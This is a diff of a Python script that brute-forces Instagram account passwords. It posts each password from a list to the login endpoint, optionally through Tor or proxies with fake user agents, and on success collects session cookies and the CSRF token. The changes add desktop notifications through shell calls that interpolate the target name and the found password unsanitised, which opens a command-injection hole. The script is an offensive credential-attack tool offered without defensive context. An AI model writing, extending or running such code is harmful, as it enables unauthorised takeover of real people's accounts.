@@ -1,8 +1,10 @@
 #!/usr/bin/python3
+import os
 import sys
 import time
 import json
 import requests
+import threading
 from datetime import datetime
 from fake_user_agents import fake_agent
 
@@ -66,8 +68,17 @@ else:
 
 save = input("save tryed passwords?: ")
 
+def green(skk): 
+    return "\033[92m {}\033[00m" .format(skk)
+
+def attack_start_notify(target):
+    os.system(f'herbe "Attack started to target: {target}"')
+def attack_hack_notify(hack):
+    os.system(f"herbe 'target password founded: {hack}'")
+
 def main(proxy):
     tryes = 0
+    threading.Thread(target=attack_start_notify, args=(target,)).start()
     for hack in bruteforce:
         tryes += 1
         hack = hack.strip()
@@ -81,8 +92,7 @@ def main(proxy):
         elif proxy == "default":
             hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)
         else:
-            print('-default running without proxy server\n-tor running with tor server')
-            exit()
+            hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)
 
         print(f"[-] trying password: {hack}")
         if save == "a":
@@ -90,10 +100,10 @@ def main(proxy):
                 tryed.write(hack)
         time.sleep(5)
         hack_data = json.loads(hack_request.text)
-        print(hack_data)
-
+        print(f'[{green("INFO")}]: {hack_data}')
         if hack_data["authenticated"]:
             print(f"[+] password founded: {hack}")
+            threading.Thread(target=attack_hack_notify, args=(hack,)).start()
             cookies = hack_request.cookies
             cookie_jar = cookies.get_dict()
             csrf_token = cookie_jar['csrftoken']
@@ -105,5 +115,7 @@ def main(proxy):
             break
 
 if __name__ == "__main__":
-    main(sys.argv[1])
-    print(sys.argv[1])
+    try:
+        main(sys.argv[1])
+    except IndexError:
+        main("default")
